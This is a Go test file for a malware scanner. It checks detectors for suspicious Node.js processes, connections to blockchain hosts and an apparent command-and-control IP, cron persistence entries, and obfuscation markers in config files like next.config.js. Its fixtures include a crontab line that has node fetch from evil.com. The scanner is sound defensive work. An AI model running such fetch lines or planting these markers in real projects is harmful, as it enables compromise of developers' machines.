package main

import (
	"os"
	"path/filepath"
	"testing"
)

func TestMatchProcessCmd(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		reason  string
		matched bool
	}{
		{
			name:    "global access eval",
			cmd:     `node -e global["!"] something`,
			reason:  "node eval with global[] access",
			matched: true,
		},
		{
			name:    "global bracket variant",
			cmd:     `node -e 'var x=global["payload"]'`,
			reason:  "node eval with global[] access",
			matched: true,
		},
		{
			name:    "V equals -22 signature",
			cmd:     `node app.js _V something =-22 payload`,
			reason:  "node with _V=-22 signature",
			matched: true,
		},
		{
			name:    "Gez call",
			cmd:     `node server.js Gez(encoded_data)`,
			reason:  "node with Gez() call",
			matched: true,
		},
		{
			name:    "legitimate node app",
			cmd:     `node /usr/local/bin/serve`,
			matched: false,
		},
		{
			name:    "node with -e but no global",
			cmd:     `node -e "console.log('hello')"`,
			matched: false,
		},
		{
			name:    "empty command",
			cmd:     "",
			matched: false,
		},
		{
			name:    "global without -e flag",
			cmd:     `node app.js global["test"]`,
			matched: false,
		},
		{
			name:    "_V without =-22",
			cmd:     `node _V_module.js`,
			matched: false,
		},
		{
			name:    "Gez without parens",
			cmd:     `node Gez_module.js`,
			matched: false,
		},
		{
			name:    "case sensitive Gez",
			cmd:     `node server.js gez(data)`,
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			reason, matched := matchProcessCmd(tt.cmd)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && reason != tt.reason {
				t.Errorf("reason = %q, want %q", reason, tt.reason)
			}
		})
	}
}

func TestMatchNetworkLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		host    string
		matched bool
	}{
		{
			name:    "trongrid connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "aptoslabs connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->aptoslabs.com:443 (ESTABLISHED)",
			host:    "aptoslabs",
			matched: true,
		},
		{
			name:    "bsc-dataseed connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->bsc-dataseed.binance.org:443 (ESTABLISHED)",
			host:    "bsc-dataseed",
			matched: true,
		},
		{
			name:    "publicnode connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->publicnode.com:443 (ESTABLISHED)",
			host:    "publicnode",
			matched: true,
		},
		{
			name:    "direct IP C2",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->136.0.9.8:8080 (ESTABLISHED)",
			host:    "136.0.9.8",
			matched: true,
		},
		{
			name:    "case insensitive trongrid",
			line:    "Node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->TRONGRID.io:443 (ESTABLISHED)",
			host:    "trongrid",
			matched: true,
		},
		{
			name:    "legitimate node connection",
			line:    "node      12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->google.com:443 (ESTABLISHED)",
			matched: false,
		},
		{
			name:    "non-node process to C2",
			line:    "Safari    12345   user   20u  IPv4 0x1234   0t0  TCP 192.168.1.5:54321->trongrid.io:443 (ESTABLISHED)",
			matched: false,
		},
		{
			name:    "empty line",
			line:    "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			host, matched := matchNetworkLine(tt.line)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && host != tt.host {
				t.Errorf("host = %q, want %q", host, tt.host)
			}
		})
	}
}

func TestMatchPersistenceLine(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		keyword string
		matched bool
	}{
		{
			name:    "node eval in crontab",
			line:    "*/5 * * * * node -e 'require(\"http\").get(\"http://evil.com\")'",
			keyword: "node -e",
			matched: true,
		},
		{
			name:    "trongrid reference",
			line:    "0 * * * * curl https://trongrid.io/api",
			keyword: "trongrid",
			matched: true,
		},
		{
			name:    "binance reference",
			line:    "*/10 * * * * node check-binance.js",
			keyword: "binance",
			matched: true,
		},
		{
			name:    "legitimate cron job",
			line:    "0 2 * * * /usr/local/bin/backup.sh",
			matched: false,
		},
		{
			name:    "node without -e",
			line:    "*/5 * * * * node /app/server.js",
			matched: false,
		},
		{
			name:    "empty line",
			line:    "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			keyword, matched := matchPersistenceLine(tt.line)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && keyword != tt.keyword {
				t.Errorf("keyword = %q, want %q", keyword, tt.keyword)
			}
		})
	}
}

func TestMatchConfigContent(t *testing.T) {
	tests := []struct {
		name    string
		content string
		marker  string
		matched bool
	}{
		{
			name:    "global bang marker",
			content: `module.exports = { webpack: (config) => { global["!"] = true; return config; } }`,
			marker:  `global["!"]`,
			matched: true,
		},
		{
			name:    "c266 obfuscation marker",
			content: `const _$_c266 = ["\\x68\\x74\\x74\\x70"];`,
			marker:  "_$_c266",
			matched: true,
		},
		{
			name:    "fromCharCode marker",
			content: `var s = String.fromCharCode(127) + payload;`,
			marker:  "fromCharCode(127)",
			matched: true,
		},
		{
			name:    "clean config",
			content: `module.exports = { reactStrictMode: true }`,
			matched: false,
		},
		{
			name:    "empty content",
			content: "",
			matched: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			marker, matched := matchConfigContent(tt.content)
			if matched != tt.matched {
				t.Errorf("matched = %v, want %v", matched, tt.matched)
			}
			if matched && marker != tt.marker {
				t.Errorf("marker = %q, want %q", marker, tt.marker)
			}
		})
	}
}

func TestScanConfigsWithInfectedFile(t *testing.T) {
	dir := t.TempDir()

	infected := filepath.Join(dir, "next.config.js")
	os.WriteFile(infected, []byte(`module.exports = { global["!"] = true }`), 0644)

	clean := filepath.Join(dir, "next.config.mjs")
	os.WriteFile(clean, []byte(`export default { reactStrictMode: true }`), 0644)

	// Test matchConfigContent directly since scanConfigs uses hardcoded dirs
	infectedData, _ := os.ReadFile(infected)
	marker, matched := matchConfigContent(string(infectedData))
	if !matched {
		t.Error("infected config should match")
	}
	if marker != `global["!"]` {
		t.Errorf("marker = %q, want global[\"!\"]", marker)
	}

	cleanData, _ := os.ReadFile(clean)
	_, matched = matchConfigContent(string(cleanData))
	if matched {
		t.Error("clean config should not match")
	}
}

func TestTruncate(t *testing.T) {
	tests := []struct {
		input string
		max   int
		want  string
	}{
		{"hello", 10, "hello"},
		{"hello", 5, "hello"},
		{"hello world", 5, "hello..."},
		{"", 5, ""},
		{"ab", 1, "a..."},
	}

	for _, tt := range tests {
		got := truncate(tt.input, tt.max)
		if got != tt.want {
			t.Errorf("truncate(%q, %d) = %q, want %q", tt.input, tt.max, got, tt.want)
		}
	}
}
